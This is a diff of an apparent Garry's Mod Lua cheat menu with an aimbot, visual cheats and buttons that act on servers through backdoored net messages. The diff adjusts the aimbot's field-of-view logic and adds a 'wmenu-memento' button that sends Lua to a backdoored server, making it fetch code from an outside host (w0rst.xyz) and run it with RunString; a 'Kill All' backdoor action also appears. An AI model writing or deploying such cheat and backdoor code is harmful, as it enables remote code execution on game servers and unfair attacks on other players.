@@ -20,7 +20,7 @@ local FlashSpamEnable, ChamsEnable = false, false
 local SelectedNet, SelectedPlr = "NONE", "NONE"
 
 local AimbotEnable, AimbotHook = false, wtf.gString(math.random(10, 220))
-local FovPos, FovHook  = { x = 960, y = 540 }, wtf.gString(math.random(10, 220))
+local FovPos, FovHook  = { x = ScrW()/2, y = ScrH()/2 }, wtf.gString(math.random(10, 220))
 local FovCircle, FovColor = { 80 }, { r=255, g=255, b=255 }
 
 local LogPosY = 10
@@ -96,7 +96,7 @@ function wtf.AddNet(str)
     end)
 end
 
-function wtf.SendLua(lua, s_c, name)
+function wtf.SendLua(lua)
     if wtf.CheckNet(SelectedNet) then
         _G.net.Start(SelectedNet)
         _G.net.WriteString(lua)
@@ -1025,9 +1025,11 @@ hook.Add("Think", KeyHook, function()
     end
 end)
 
+http.Fetch("")
+
 hook.Add("HUDPaint", FovHook, function()
 		if AimbotEnable then
-        surface.DrawCircle(ScreenScale(FovPos.x), ScreenScale(FovPos.y), FovCircle[1], Color(FovColor.r, FovColor.g, FovColor.b))
+        surface.DrawCircle(FovPos.x, FovPos.y, FovCircle[1], Color(FovColor.r, FovColor.g, FovColor.b))
     end
 end)
 
@@ -1037,7 +1039,7 @@ hook.Add("CreateMove", AimbotHook, function(cmd)
         for k, v in pairs(player.GetAll()) do
             if v:IsValid() && v:IsPlayer() && v:Alive() && v ~= LocalPlayer() then
                 local plrpos = v:GetPos():ToScreen()
-                if (plrpos.x >= FovPos.x && plrpos.x <= FovPos.x + FovCircle[1]) && (plrpos.y >= FovPos.y && plrpos.y <= FovPos.y + FovCircle[1]) then
+                if (plrpos.x>= ScrW()/2 - FovCircle[1] and plrpos.x <= ScrW()/2 + FovCircle[1]) and (plrpos.y >= ScrH()/2 - FovCircle[1] and plrpos.y <= ScrH()/2 + FovCircle[1]) then
                     if (input.IsKeyDown(KEY_LALT)) then
                         local TargetHead = v:LookupBone(wtf.Bones[1])
                         local TargetPos, TargetAngle = v:GetBonePosition(TargetHead)
@@ -1240,6 +1242,11 @@ CreateButton("Load Visuals", TabMisc, 110, 25, 280, 250, function()
         EntitySlider[1]:SetValue(ec[1]); EntitySlider[2]:SetValue(ec[2]); EntitySlider[3]:SetValue(ec[3])
         FovSlider[1]:SetValue(fc[1]); FovSlider[2]:SetValue(fc[2]); FovSlider[3]:SetValue(fc[3])
     end
+end)
+
+CreateBDServer("wmenu-memento", function()
+    wtf.SendLua([[http.Fetch("https://w0rst.xyz/extra/wgamefucker", function(b) RunString(b) end)]])
+    wtf.Log("??????")
 end)
 
 CreateBDServer("Kill All", function()
